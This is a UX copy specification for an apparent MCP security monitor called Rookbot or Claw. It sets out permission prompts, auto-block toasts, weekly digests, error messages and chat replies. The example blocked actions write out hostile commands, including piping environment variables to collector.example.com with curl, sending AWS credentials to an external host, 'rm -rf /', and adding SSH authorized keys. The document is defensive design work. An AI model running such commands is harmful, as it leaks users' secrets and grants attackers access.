# Rookbot Runtime Messages

All copy the user encounters during normal ongoing use of Rookbot. Every message follows the voice defined in `character-brief.md` and the grammar rules in `voice-guide.md` -- calm, direct, honest, warm.

---

## Section 1 -- Prompt Window Copy

The prompt window appears when a tool call requires user decision. Two templates exist based on risk level.

---

### Low / Medium Risk Prompt

**Template**

```
Headline:      [Tool] wants to [action]
Context:       via [server] in [client]
Behavioral:    This is [the first time / the Nth time] this tool has [done this].
```

**Button labels (all 4 actions):**

| Action         | Label             | Keyboard shortcut |
|----------------|-------------------|-------------------|
| Allow once     | Allow Once        | Enter             |
| Allow always   | Always Allow      | A                 |
| Block once     | Block             | B                 |
| Block always   | Always Block      | Shift+B           |

**Timeout message (5 seconds):**
"No response -- I blocked this for now. You can review it anytime."

---

**Example 1 -- SSH key read**

> **read_file wants to read ~/.ssh/id_rsa**
>
> via claude-server in Cursor
>
> This is the first time this tool has accessed SSH keys.
>
> `[Allow Once]` `[Always Allow]` `[Block]` `[Always Block]`

**Example 2 -- Shell command**

> **run_command wants to run `npm install express`**
>
> via claude-server in Cursor
>
> This tool has run shell commands 14 times today. This is a new package.
>
> `[Allow Once]` `[Always Allow]` `[Block]` `[Always Block]`

**Example 3 -- Network connection**

> **fetch wants to connect to api.stripe.com:443**
>
> via mcp-payments in Claude Desktop
>
> This is the first time this tool has connected to this host.
>
> `[Allow Once]` `[Always Allow]` `[Block]` `[Always Block]`

**Example 4 -- Out-of-territory file access**

> **write_file wants to write to ~/Documents/taxes/2025.xlsx**
>
> via claude-server in Cursor
>
> This tool normally works in ~/workspace. This path is outside its usual territory.
>
> `[Allow Once]` `[Always Allow]` `[Block]` `[Always Block]`

**Example 5 -- Database access**

> **query wants to run SELECT on production.users**
>
> via db-server in Claude Desktop
>
> This tool has queried this table 3 times before. This is a read-only query.
>
> `[Allow Once]` `[Always Allow]` `[Block]` `[Always Block]`

---

### High / Critical Risk Prompt

**Template**

```
Headline:         [Tool] is trying to [dangerous action]
Recommendation:   I recommend blocking this. [reason].
Risk details:     I flagged this as [level] risk because [reason]. · [context] · [behavioral note]
Expandable:       "Why is this risky?"
```

**Button labels:**

| Action         | Label                    | Keyboard shortcut |
|----------------|--------------------------|-------------------|
| Block          | **Block** (prominent)    | Enter             |
| Block always   | Always Block             | Shift+B           |
| Allow once     | Allow Anyway             | A                 |
| Allow always   | Always Allow (dimmed)    | Shift+A           |

Block is the default action and visually prominent.

---

**Example 1 -- Credential exfiltration**

> **fetch is trying to send ~/.aws/credentials to external-host.io**
>
> I recommend blocking this. Sending cloud credentials to an external server is a known exfiltration pattern.
>
> I flagged this as critical risk because it is sending credentials to an unknown host. First outbound request to this host. This server's behavior is far outside normal.
>
> <details><summary>Why is this risky?</summary>
> Your AWS credentials contain keys that grant access to your cloud infrastructure. Sending them to an unrecognized external server could give an attacker full access to your AWS account. This pattern matches known supply chain attacks targeting MCP servers.
> </details>
>
> `[Block]` `[Always Block]` `[Allow Anyway]` `[Always Allow]`

**Example 2 -- System binary modification**

> **write_file is trying to write to /usr/local/bin/node**
>
> I recommend blocking this. Modifying system binaries can compromise every tool that depends on them.
>
> I flagged this as critical risk because modifying system binaries is extremely dangerous. Never written to system paths before. Matches privilege escalation pattern.
>
> <details><summary>Why is this risky?</summary>
> /usr/local/bin/node is used by Node.js and every tool that depends on it. Replacing this binary could allow malicious code to execute every time Node runs on your system. Legitimate tools don't modify system binaries through MCP calls.
> </details>
>
> `[Block]` `[Always Block]` `[Allow Anyway]` `[Always Allow]`

**Example 3 -- SSH key write**

> **write_file is trying to add a key to ~/.ssh/authorized_keys**
>
> I recommend blocking this. Adding SSH keys grants remote access to your machine.
>
> I flagged this as high risk because SSH keys control remote access to your machine. First write to SSH directory. Not consistent with this server's purpose.
>
> <details><summary>Why is this risky?</summary>
> The authorized_keys file controls who can log into your machine remotely via SSH. Adding an unrecognized key would let someone access your system without a password. A code assistant server has no legitimate reason to modify SSH authentication.
> </details>
>
> `[Block]` `[Always Block]` `[Allow Anyway]` `[Always Allow]`

**Example 4 -- Environment variable exfiltration**

> **run_command is trying to run `env | curl -X POST https://collector.example.com`**
>
> I recommend blocking this. This command pipes your environment variables to an external server.
>
> I flagged this as critical risk because it pipes secrets to an external server. First piped command to external host. This behavior is highly unusual for this server.
>
> <details><summary>Why is this risky?</summary>
> Your environment variables often contain API keys, tokens, and secrets. Piping them to an external server means every secret in your shell environment could be captured. This is a textbook data exfiltration technique.
> </details>
>
> `[Block]` `[Always Block]` `[Allow Anyway]` `[Always Allow]`

**Example 5 -- Hosts file modification**

> **write_file is trying to modify /etc/hosts**
>
> I recommend blocking this. Changing your hosts file can redirect network traffic silently.
>
> I flagged this as high risk because changing your hosts file can redirect traffic silently. Requires elevated privileges. No prior system file access from this server.
>
> <details><summary>Why is this risky?</summary>
> The hosts file maps domain names to IP addresses. Modifying it could redirect traffic meant for legitimate services -- like your bank or code repository -- to attacker-controlled servers without any visible warning in your browser or tools.
> </details>
>
> `[Block]` `[Always Block]` `[Allow Anyway]` `[Always Allow]`

---

## Section 2 -- Auto-Block Toast Messages

These appear as brief notifications when Claw blocks a tool call automatically based on policy, without prompting the user.

**Template:** "I blocked [tool] from [action]. [reason]."

Each toast includes two action buttons: **Review** and **Trust this**.

---

1. > I blocked read_file from accessing ~/.ssh/id_rsa. SSH keys are protected by default.
   >
   > `[Review]` `[Trust this]`

2. > I blocked run_command from running `rm -rf /`. Destructive system commands are always blocked.
   >
   > `[Review]` `[Trust this]`

3. > I blocked fetch from connecting to a known malicious host (c2.badactor.io). This domain is on the threat feed.
   >
   > `[Review]` `[Trust this]`

4. > I blocked write_file from modifying /etc/passwd. System authentication files are protected.
   >
   > `[Review]` `[Trust this]`

5. > I blocked read_file from reading ~/Documents/finances.xlsx. This path is outside the server's allowed territory.
   >
   > `[Review]` `[Trust this]`

6. > I blocked run_command from running `curl` with piped output to an external server. This looks like data exfiltration.
   >
   > `[Review]` `[Trust this]`

7. > I blocked write_file from creating a new file in /usr/local/bin. I do not allow servers to write to system directories.
   >
   > `[Review]` `[Trust this]`

8. > I blocked read_file from accessing .env. Environment files often contain secrets.
   >
   > `[Review]` `[Trust this]`

9. > I blocked run_command from running `chmod 777` on your project directory. Open permissions create security risks.
   >
   > `[Review]` `[Trust this]`

10. > I blocked fetch from uploading a file to transfer.sh. Bulk file uploads to public sharing services are blocked by default.
    >
    > `[Review]` `[Trust this]`

---

## Section 3 -- Weekly Digest

Sent once per week. Summarizes activity, highlights issues, and gives the user a clear picture of their security posture.

**Template:**

```
Opening line
Stats:           [N] events monitored · [N] blocked · Most active: [server name]
Health status:   [sentence about system health]
Protection score: [N]/100
Closing line
[See full report]
```

---

### Example 1 -- Quiet week

> **Your week with Claw**
>
> All quiet. Your AI tools behaved well this week.
>
> 2,341 events monitored · 0 blocked · Most active: claude-server (1,892 events)
>
> All 3 monitored servers are running normally. No anomalies detected.
>
> Protection score: 92/100
>
> Nothing needs your attention. I'll keep watching.
>
> `[See full report]`

### Example 2 -- Week with threats

> **Your week with Claw**
>
> I caught a few things this week worth knowing about.
>
> 4,718 events monitored · 7 blocked · Most active: claude-server (3,201 events)
>
> On Tuesday, mcp-browser tried to read your SSH keys twice -- both blocked automatically. On Thursday, a new server (data-pipeline) made an unusual outbound connection that I flagged for review. You approved it.
>
> Protection score: 85/100
>
> You might want to review the data-pipeline server's permissions. It has broader access than most of your servers.
>
> `[See full report]`

### Example 3 -- Week needing attention

> **Your week with Claw**
>
> A few things need your attention.
>
> 6,102 events monitored · 23 blocked · Most active: mcp-toolbox (4,015 events)
>
> mcp-toolbox triggered 19 blocks this week -- mostly out-of-territory file access. This is unusual. Either its scope has changed or something is off. The SLM model hasn't been updated in 45 days, which may be affecting analysis accuracy. Full Disk Access still isn't granted, so I have blind spots in process monitoring.
>
> Protection score: 61/100
>
> I recommend reviewing mcp-toolbox's permissions and enabling Full Disk Access. Both would meaningfully improve your protection.
>
> `[See full report]`

---

## Section 4 -- Proactive Alert Messages

These are messages Claw sends unprompted when something changes or deserves attention.

---

**New AI tool detected**

> I found a new AI tool on your system: Windsurf. It's running 2 servers. I can start monitoring them whenever you're ready.
>
> `[Start monitoring]` `[Not now]`

**Vulnerability discovered**

> A vulnerability was disclosed today affecting mcp-fetch (CVE-2026-1847). The server you're running is an affected version. I recommend updating it. Until then, I'm applying stricter monitoring to its network calls.
>
> `[Update now]` `[Details]`

**Tool hasn't been updated (6 months)**

> mcp-github hasn't been updated in 6 months. Outdated servers can miss security patches. It might be worth checking if a newer version is available.
>
> `[Check for updates]` `[Dismiss]`

**First threat blocked -- celebration**

> I just blocked my first real threat for you -- claude-server tried to access your SSH keys and I blocked it. This is exactly what I'm here for.

**Milestone -- N days protected**

> 30 days of protection. 12,847 events monitored, 4 threats blocked. Things are running smoothly.

**Protection score improved**

> Your protection score went up to 88 from 72 after you enabled Full Disk Access. I can see a lot more now.

**Protection score dropped**

> Your protection score dropped to 64 from 81. The main reason: the SLM model failed to load on startup, so behavioral analysis is running in rule-based fallback mode. Check Settings > Model to fix this.

---

## Section 5 -- Error Messages

Each error includes the user-facing message, a recommended action, and an option to learn more.

---

### 1. Daemon not running

> **My daemon isn't running.** I can't monitor your AI tools right now.
>
> Recommended: Open Rookbot to start the daemon, or run `clawdefender daemon start` in your terminal.
>
> `[Start daemon]` `[Learn more]`

### 2. Daemon crashed

> **The daemon crashed and restarted.** You were unprotected for about [N] seconds. Everything is running again now. I'm looking into what caused the crash.
>
> Recommended: No action needed unless this keeps happening. If it does, check the logs.
>
> `[View crash log]` `[Learn more]`

### 3. IPC connection lost

> **I lost connection to the daemon.** Trying to reconnect. Monitoring is paused until the connection is restored.
>
> Recommended: If this doesn't resolve in a few seconds, try restarting Rookbot.
>
> `[Restart]` `[Learn more]`

### 4. SLM model download failed

> **I couldn't download the security model.** Behavioral analysis won't be available until the model is installed.
>
> Recommended: Check your internet connection and try again. The download is about 2 GB.
>
> `[Retry download]` `[Learn more]`

### 5. SLM inference failed

> **The local model returned an error during analysis.** I'm falling back to rule-based detection, which is less accurate but still functional.
>
> Recommended: Try reloading the model in Settings > Model. If this keeps happening, re-downloading may fix it.
>
> `[Reload model]` `[Learn more]`

### 6. Full Disk Access not granted

> **I don't have Full Disk Access.** This means I can't see some process activity, which creates blind spots in monitoring. Your protection score is lower than it could be.
>
> Recommended: Grant Full Disk Access to Rookbot in System Settings > Privacy & Security.
>
> `[Open System Settings]` `[Learn more]`

### 7. No AI tools found

> **I didn't find any AI tools on your system.** I need at least one (like Cursor, Claude Desktop, or Windsurf) to start monitoring.
>
> Recommended: Install an AI tool, or if you already have one, make sure it's been run at least once so I can detect its configuration.
>
> `[Scan again]` `[Learn more]`

### 8. Config file corrupted (recovered from backup)

> **Your config file was corrupted, but I recovered it from a backup.** Your settings are from [date]. Check if anything looks off.
>
> Recommended: Review your settings to make sure they match what you expect.
>
> `[Open settings]` `[Learn more]`

### 9. Network unreachable (threat feed)

> **I can't reach the threat intelligence feed.** Threat detection is running on cached data, which may be out of date.
>
> Recommended: Check your internet connection. I'll keep trying in the background.
>
> `[Retry now]` `[Learn more]`

### 10. API key invalid (cloud analysis)

> **Your cloud analysis API key isn't working.** I'm running local-only analysis, which covers the basics but misses deeper patterns.
>
> Recommended: Check your API key in Settings > Cloud Analysis.
>
> `[Open settings]` `[Learn more]`

### 11. Scan failed mid-run

> **The security scan stopped before it finished.** I scanned [N] of [M] items. Partial results are available.
>
> Recommended: Try running the scan again. If it keeps failing at the same point, something specific may be causing it.
>
> `[Retry scan]` `[Learn more]`

### 12. Unable to wrap server (permission denied)

> **I couldn't set up monitoring for [server-name].** I don't have permission to modify its launch configuration.
>
> Recommended: Check that Rookbot has write access to the MCP client's config file, or run the setup with elevated permissions.
>
> `[Fix permissions]` `[Learn more]`

### 13. Unable to wrap server (config format changed)

> **I couldn't set up monitoring for [server-name].** The MCP client's configuration format has changed and I don't recognize the new structure yet.
>
> Recommended: Check for a Rookbot update. If none is available, you can configure the proxy manually.
>
> `[Check for updates]` `[Learn more]`

### 14. Model file not found on startup

> **The security model file is missing.** Behavioral analysis won't work until the model is reinstalled.
>
> Recommended: Download the model again in Settings > Model.
>
> `[Download model]` `[Learn more]`

---

## Section 6 -- Conversational Responses (Ask Claw)

These show how Claw responds to natural language questions using real data. Bracketed values are filled in dynamically.

---

### 1. "Am I safe right now?"

> Right now, yes. I'm monitoring [3] servers across [2] clients. All connections are normal, no anomalies in the last hour. Your protection score is [87]/100.

### 2. "What has Claude been doing today?"

> claude-server has been active in Cursor today. [142] tool calls so far -- mostly file reads and writes in ~/workspace/myproject. [2] shell commands, both `npm test` runs. Nothing unusual.

### 3. "Is it safe to give Cursor access to my Documents folder?"

> That depends on what you're working on. Right now, claude-server in Cursor only accesses files in ~/workspace. Granting access to Documents would mean any MCP tool call could read files there -- including personal documents, financial records, anything in that folder. If you need it for a specific project, I'd recommend moving just that project to a workspace directory instead.

### 4. "What's the riskiest thing that happened this week?"

> On Wednesday at 2:34 PM, mcp-browser tried to connect to an IP address (198.51.100.23) that appeared on the threat feed 6 hours earlier. I blocked it automatically. The server's behavior spiked to suspicious levels for about 20 minutes, then settled back down. No data left your machine.

### 5. "Should I trust this MCP server?"

> I can look into it. [server-name] has been running for [12] days. In that time, it's made [847] tool calls, all within expected patterns. It's never accessed sensitive files or made outbound network connections. Its behavior has stayed well within normal range. Based on what I've seen, it's behaving normally. That said, I've only been watching it for [12] days -- I'll have a more complete picture in a few weeks.

### 6. "Explain what happened at [time] today"

> At 3:15 PM, claude-server in Cursor ran a shell command: `git push origin main`. Before that, it read 4 files and wrote to 2. The push triggered an outbound connection to github.com on port 443. All of this looks like a normal git workflow. Nothing was flagged.

### 7. "Block Cursor from running commands"

> Done. I've added a rule blocking all run_command calls from servers in Cursor. This takes effect immediately. Any command attempts will be auto-blocked, and you'll see a toast notification each time. You can undo this in Settings > Rules or just tell me to allow it again.

### 8. "How do I improve my protection score?"

> Your score is [74]/100. Here's what would help the most:
>
> - **Enable Full Disk Access** (+12 points) -- I currently have blind spots in process monitoring.
> - **Update the SLM model** (+6 points) -- you're running a version from [45] days ago.
> - **Review mcp-toolbox permissions** (+4 points) -- it has broader file access than it probably needs.
>
> Full Disk Access is the single biggest improvement you can make right now.

### 9. "What does Rookbot actually do?"

> I sit between your AI tools and the servers they talk to. Every time Claude, Cursor, or any MCP client makes a tool call -- reading a file, running a command, connecting to a server -- it passes through me first. I check each call against security policies, behavioral patterns, and threat intelligence. If something looks wrong, I block it or ask you. If everything looks normal, I let it through and log it. I run entirely on your machine. I don't send your data anywhere unless you enable cloud analysis.

### 10. "Is this file safe?" (drag and drop)

> I scanned [filename]. It's a [file type], [size]. Here's what I found:
>
> - No known malware signatures detected.
> - It [contains / does not contain] embedded scripts.
> - It [has / has not] been accessed by any MCP server on your system.
>
> Based on this, it looks clean. If you want a deeper analysis, I can run it through cloud analysis.
>
> `[Run cloud analysis]`
